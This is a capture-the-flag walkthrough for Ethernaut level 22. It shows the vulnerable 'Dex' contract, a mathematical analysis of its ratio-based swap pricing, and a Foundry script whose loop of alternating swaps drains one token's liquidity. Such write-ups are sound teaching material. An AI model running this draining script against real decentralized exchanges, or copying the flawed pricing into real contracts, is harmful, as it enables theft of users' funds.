# Ethernaut Level 22 Dex

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

The `Dex` contract starts with a liquidity of 100 for both token1 and token2. Player starts with a balance of 10 for both tokens. We have to exploit the vulnerability of the contract to drain the dex liquidity of one of the tokens. The swapping logic is in function `getSwapPrice()`: `return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))`. We can see that we caculate `swapAmount` by using a simple ratio of from-to liquidity and times `amountFrom`. We can use mathematical analysis to represent this swapping logic: 

We can let $X_n$ to be the liquidity of *from* token before n-th swap, and $Y_n$ to be the liquidity of *to* token before n-th swap. For the attacker (user), we set $a_n$ to be the amount of *from* token that the attacker wants to swap from the dex, and $b_n$ to be the amount of *to* token that will be swapped based on the swapping logic. We will have:
$$
b_n = \lfloor\frac{Y_n a_n}{X_n} \rfloor 
$$
It is true when $a_n <= attackerBalance$.

And we have:
$$
X_{n+1} = X_n + a_n \\
Y_{n+1} = Y_n - b_n
$$
 So we will have:
$$
Y_{n+1} = Y_n - \frac{Y_n a_n}{X_n} \\
\frac{Y_{n+1}}{Y_n} = \frac{X_n - a_n}{X_n}
$$
Time $\frac{Y_n}{X_{n+1}}$ on both sides:
$$
\frac{Y_{n+1}}{Y_n} \bullet \frac{Y_n}{X_{n+1}} = \frac{X_n - a_n}{X_n} \bullet \frac{Y_n}{X_{n+1}}\\
\frac{Y_{n+1}}{X_{n+1}}= \frac{Y_n}{X_n} \bullet \frac {X_n - a_n}{X_n + a_n}
$$
If we let $r_n = \frac{Y_n}{X_n}$, and $a_n = \epsilon X_n$, $0<\epsilon<1$, then we have:
$$
r_{n+1} = r_n \bullet \frac{1-\epsilon}{1+\epsilon} \\
r_n = r_0 (\frac{1-\epsilon}{1+\epsilon})^n
$$
It is easy to see that $r_n$ is strictly monotonically decreasing, and will be **0** when n becomes infinitely large. So we can drain the liquidity of the *to* token by swapping it *many* times. In this case, we can just swap all the player's balance of token1 to token2, then swap all the balance of token2 to token1..., and at a certain iteration, we can drain the liquidity of either token1 or token2.

`IDex.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}
```

Use an interface to interact with `Dex` instance.

`Dex.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IDex} from "../src/IDex.sol";

contract DexScript is Script {
    address constant DEX_ADDRESS = 0xXXXXXXXXXXX;
    IDex dex = IDex(DEX_ADDRESS);
    address token1 = dex.token1();
    address token2 = dex.token2();
    bool toggle = true;

    function attack() public {
        if (toggle) {
            safeSwap(token1, token2);
        } else {
            safeSwap(token2, token1);
        }
        toggle = !toggle;
    }

    function safeSwap(address from, address to) public {
        uint256 fromLiquidity = dex.balanceOf(from, DEX_ADDRESS);
        uint256 toLiquidity = dex.balanceOf(to, DEX_ADDRESS);
        uint256 fromBalance = dex.balanceOf(from, msg.sender);
        uint256 amountToSwap = dex.getSwapPrice(from, to, fromBalance);
        amountToSwap = amountToSwap < toLiquidity ? amountToSwap : toLiquidity;
        uint256 amountFrom = (fromLiquidity * amountToSwap) / toLiquidity;
        dex.swap(from, to, amountFrom);
    }

    function run() external {
        vm.startBroadcast();
        dex.approve(DEX_ADDRESS, type(uint256).max);
        while (dex.balanceOf(token1, DEX_ADDRESS) > 0 && dex.balanceOf(token2, DEX_ADDRESS) > 0) {
            attack();
        }
        vm.stopBroadcast();
        console.log("Dex token1 balance:", dex.balanceOf(token1, DEX_ADDRESS));
        console.log("Dex token2 balance:", dex.balanceOf(token2, DEX_ADDRESS));
    }
}
```

This is the main attack logic. Notice that we have this line `dex.approve(DEX_ADDRESS, type(uint256).max);` to first grant full allowance for token1 and token2 from EOA to `Dex` so that the `Dex` can spend them for us. We use a `safeSwap` function to calculate the exact `amountFrom` before swapping because if the liquidity of the *to* token is less than the `amountToSwap`, the transfer function will fail since the `Dex` won't have enough money for the transaction.
